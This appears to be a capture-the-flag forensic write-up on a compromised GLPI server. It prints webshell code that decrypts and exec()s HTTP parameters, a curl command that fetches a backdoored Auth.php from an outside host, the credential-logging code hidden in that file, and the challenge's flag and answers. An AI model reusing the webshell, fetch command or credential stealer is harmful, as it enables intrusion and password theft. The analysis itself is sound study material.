<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# Operation Pensieve Breach – 2 — Write-up

## Overview

This repository contains the forensic analysis and solution for the **Hack The Box - Operation Pensieve Breach - 2** style incident.

The investigation revolves around a compromised GLPI instance where the **director of Hogwarts (Albus Dumbledore)** had his account compromised after logging in from:

- IP: `192.168.56.230`
- Hostname: `pensive.hogwarts.local`

Our goals:

1. Identify **how his account got compromised** from this server.
2. Find:
   - The **absolute path of the file which led to the compromise**.
   - The **absolute path of the file used by the attacker to retrieve Albus' account**.
   - From that second file, extract the **value of the second field of the second stored piece of information**.
3. Build the final flag in the format:

   ```text
   Hero{<first_path>;<second_path>;<value>}
   ```

---

## 1. Initial triage & logs

We start in the extracted `pensieve_var` directory (simulating `/var` on the server).

### 1.1. Time-based file changes

We list files changed in the relevant compromise window:

```bash
cd ~/pensieve2/var

find . -type f   -newermt '2025-11-22 22:45' ! -newermt '2025-11-22 23:59'   -printf '%TY-%Tm-%Td %TH:%TM:%TS %s %p\n' | sort
```

Notable entries:

- `./www/glpi/files/_tmp/setup.php` — created at `2025-11-22 23:03:50`.
- `./www/glpi/src/Auth.php` — modified at `2025-11-22 23:10:03`.
- `./www/glpi/pics/screenshots/example.gif` — size 154 bytes, timestamp `2025-11-22 23:11:56`.
- GLPI session and log files around the same time.

These are strong candidates for malicious activity.

---

## 2. Webshell: `setup.php` in GLPI temp

List the temp directory:

```bash
ls -l www/glpi/files/_tmp
```

We see:

```text
-rwxrwxr-x 1 vboxuser vboxuser 3550 Nov 22 23:03 setup.php
```

Inspect it:

```bash
sed -n '1,200p' www/glpi/files/_tmp/setup.php
```

Key parts (trimmed):

```php
/****************************************************************
 * Webshell Usage:
 *   ?passwd=P@ssw0rd123 --> Print glpi passwords in use
 *   ?passwd=P@ssw0rd123&_hidden_cmd=whoami --> Execute whoami
 ****************************************************************/

...

if (isset($_GET["submit_form"]) && $_GET["submit_form"] === "2b01d9d592da55cca64dd7804bc295e6e03b5df4") {
  ...
  if (file_exists($to_include)) {
    include_once($to_include);
    try {
      Html::header("GLPI Password");

      $key = "14ac4b90bd3f880e741a85b0c6254d1f";
      $iv  = "5cf025270d8f74c9";

      if (isset($_GET["save_result"]) && !empty($_GET["save_result"])) {
        $encrypted = base64_decode($_GET['save_result']);
        $decrypted = openssl_decrypt($encrypted, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);

        exec($decrypted, $output, $retval);

        echo "<code>";
        foreach ($output as $line) {
          echo htmlentities($line) . "</br>";
        }
        echo "</code></br>";
      } else {
        dump_password();
      }
```

### What this does

- Exposes a backdoor via `front/plugin.php` using a **magic `submit_form` value**.
- If `save_result` is present:
  - Base64-decodes and AES-256-CBC decrypts it using a static key/IV.
  - Executes the decrypted string with `exec()`.

This gives the attacker **full remote code execution (RCE)** via HTTP.

---

## 3. Correlating with Apache logs

We search for the webshell being hit:

```bash
grep -n "setup.php" log/apache2/glpi_access.log log/apache2/glpi_ssl_access.log

grep -n "save_result=" log/apache2/glpi_access.log log/apache2/glpi_ssl_access.log
```

We find (cleaned up):

```text
192.168.56.200 - - [22/Nov/2025:23:03:49 +0000] "POST /ajax/fileupload.php?_method=DELETE&_uploader_picture%5B%5D=setup.php HTTP/1.1" 200 ...

192.168.56.1 - - [22/Nov/2025:23:09:36 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=oGAHt/Kk1OKeXWxy7iXUfw== ...

192.168.56.1 - - [22/Nov/2025:23:10:02 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE= ...

192.168.56.1 - - [22/Nov/2025:23:10:51 +0000] "GET /front/plugin.php?submit_form=2b01d9d592da55cca64dd7804bc295e6e03b5df4&save_result=86AyGErKuj5UoZE9eHtlIg== ...
```

So the attacker is:

1. Uploading `setup.php` (via file upload endpoints).
2. Calling `plugin.php` with the special `submit_form` and encrypted `save_result` commands.

---

## 4. Decrypting the attacker’s commands

Using the key and IV from `setup.php`:

```bash
php -r '
$key = "14ac4b90bd3f880e741a85b0c6254d1f";
$iv  = "5cf025270d8f74c9";

$vals = [
  "oGAHt/Kk1OKeXWxy7iXUfw==",
  "4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE=",
  "86AyGErKuj5UoZE9eHtlIg==",
];

foreach ($vals as $b64) {
  $enc = base64_decode($b64);
  $dec = openssl_decrypt($enc, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);
  echo $b64, " -> ", $dec, PHP_EOL, "-------------------------", PHP_EOL;
}
'
```

Output:

```text
oGAHt/Kk1OKeXWxy7iXUfw== -> 
-------------------------
4xRW8Us32tnzow8KiLOwuASwWypc4XE2LBDXaWQLmATmYOlVNcpYABK5gfF5xiwvLu1s6UpjuW2aJk94xSXQ1AaVGQFwdNpNR/7wqKV6JAE= -> curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
-------------------------
86AyGErKuj5UoZE9eHtlIg== -> whoami
-------------------------
```

The critical command:

```bash
curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
```

So the attacker **downloads a backdoored authentication file** and overwrites the original GLPI `Auth.php`.

We also saw this file’s timestamp in the earlier `find` output:

```text
2025-11-22 23:10:03 ... ./www/glpi/src/Auth.php
```

which matches the timing of that malicious request.

---

## 5. Discovering the backdoor in `Auth.php`

Since `Auth.php` was overwritten, we inspect it for suspicious modifications:

```bash
grep -niE 'file_put_contents|fopen|fwrite|/var/' www/glpi/src/Auth.php
```

We get a hit near line 975. Dump around that region:

```bash
sed -n '940,990p' www/glpi/src/Auth.php
```

We find this malicious block inside the login logic:

```php
if (
    empty($login_auth)
    || $this->user->fields["authtype"] == $this::CAS
    || $this->user->fields["authtype"] == $this::EXTERNAL
    || $this->user->fields["authtype"] == $this::LDAP
) {
    if (Toolbox::canUseLdap()) {
        $key = "ec6c34408ae2523fe664bd1ccedc9c28";
        $iv  = "ecb2b0364290d1df";

        $data = json_encode([
            'login' => $login_name,
            'password' => $login_password,
        ]);

        $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        $encoded = base64_encode($encrypted) . ";";

        $file = "/var/www/glpi/pics/screenshots/example.gif";
        file_put_contents($file, $encoded, FILE_APPEND);

        AuthLDAP::tryLdapAuth(
            $this,
            $login_name,
            $login_password,
            $this->user->fields["auths_id"]
        );
```

### What this does

On each LDAP/EXTERNAL/CAS login attempt, it:

1. Packages `login_name` and `login_password` into a JSON object.
2. Encrypts it with AES-256-CBC using a separate static key and IV.
3. Base64-encodes the ciphertext and appends a `;`.
4. Appends this data into:

   ```text
   /var/www/glpi/pics/screenshots/example.gif
   ```

This is a **credential stealer** hidden in the GLPI authentication flow.

> **This file – `/var/www/glpi/src/Auth.php` – is the one that led to the compromise**  
> because it silently logged Albus’ credentials when he logged in.

---

## 6. The credential stash: `example.gif`

List the screenshots:

```bash
ls -l www/glpi/pics/screenshots
```

Notable:

```text
-rwxrwxr-x 1 vboxuser vboxuser    154 Nov 22 23:11 example.gif
```

All the other images are large PNG/GIF files in the hundreds of KB range. `example.gif` is tiny (154 bytes), which is extremely suspicious.

We then extract Base64 chunks from it:

```bash
strings -n 20 www/glpi/pics/screenshots/example.gif   | tr ';' '
'   | grep -E '^[A-Za-z0-9+/=]{20,}$'   | sed '/^$/d'   | nl -ba
```

Output:

```text
     1  mbzTGN3mBbqOHr/h3/c2uebIG7VPft37SXR+hurPIglCYfLeFqIzSM/R9lLhKp5K
     2  U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==
```

As per the challenge description, this file stores **two pieces of information**.  
Each line is one encrypted JSON blob created by the malicious `Auth.php`.

---

## 7. Decrypting the stored credentials

We use the second AES key/IV from the backdoored `Auth.php`:

```bash
php -r '
$key = "ec6c34408ae2523fe664bd1ccedc9c28";
$iv  = "ecb2b0364290d1df";

$blob = "U+IiFdoC53E4vV+9aTeVHbsp/0YRYqDqQzvx0gBGpzIPAhEYlgd5SjpPPQOLgmmoCbWKLREBHparNdsK2BQ3tQ==";

$enc = base64_decode($blob);
$dec = openssl_decrypt($enc, "AES-256-CBC", $key, OPENSSL_RAW_DATA, $iv);
echo $dec, PHP_EOL;
'
```

Output:

```text
{"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}
```

So the **second piece of information** is:

```json
{
  "login": "albus.dumbledore",
  "password": "FawkesPhoenix#9!"
}
```

Within this JSON:

- First field: `"login" : "albus.dumbledore"`
- Second field: `"password" : "FawkesPhoenix#9!"`

The challenge asks:

> The 3rd flag part is the value of the **second field** of the **second piece of information**.

That is:

```text
FawkesPhoenix#9!
```

> **The second file used by the attacker to retrieve Albus’ account is**  
> `/var/www/glpi/pics/screenshots/example.gif`.

---

## 8. How Dumbledore’s account was compromised

1. The attacker uploads a malicious `setup.php` into GLPI’s temp files and triggers it through `front/plugin.php` with a magic `submit_form` value.
2. That webshell decrypts the `save_result` parameter and executes it. One of the attacker’s commands is:

   ```bash
   curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
   ```

3. This replaces the legitimate GLPI authentication file (`Auth.php`) with a **backdoored version** that logs any LDAP-style login credentials to:

   ```text
   /var/www/glpi/pics/screenshots/example.gif
   ```

4. When Albus Dumbledore later logs in from `pensive.hogwarts.local (192.168.56.230)`, his credentials are stored in `example.gif` as:

   ```json
   {"login":"albus.dumbledore","password":"FawkesPhoenix#9!"}
   ```

5. The attacker can then download `example.gif`, decrypt the Base64 blobs, and recover his password.

---

## 9. Final answers / Flag

Per the challenge questions:

1. **Absolute path of the file which led to the compromise**  
   → the backdoored authentication file:

   ```text
   /var/www/glpi/src/Auth.php
   ```

2. **Absolute path of the file used by the attacker to retrieve Albus' account**  
   → the credential stash:

   ```text
   /var/www/glpi/pics/screenshots/example.gif
   ```

3. **The second field of the second piece of information stored in that file**  
   → `"password"` value from the second entry:

   ```text
   FawkesPhoenix#9!
   ```

### Final flag

```text
Hero{/var/www/glpi/src/Auth.php;/var/www/glpi/pics/screenshots/example.gif;FawkesPhoenix#9!}
```

---

## 10. Summary

- **Initial entry & RCE**: via `www/glpi/files/_tmp/setup.php` used through `front/plugin.php`.
- **Persistence & credential theft**: backdoored `/var/www/glpi/src/Auth.php`.
- **Exfil path**: credentials written in encrypted form to `/var/www/glpi/pics/screenshots/example.gif`.
- **Compromised account**: `albus.dumbledore` with password `FawkesPhoenix#9!`.

This completes the investigation for *Operation Pensieve Breach – 2*.
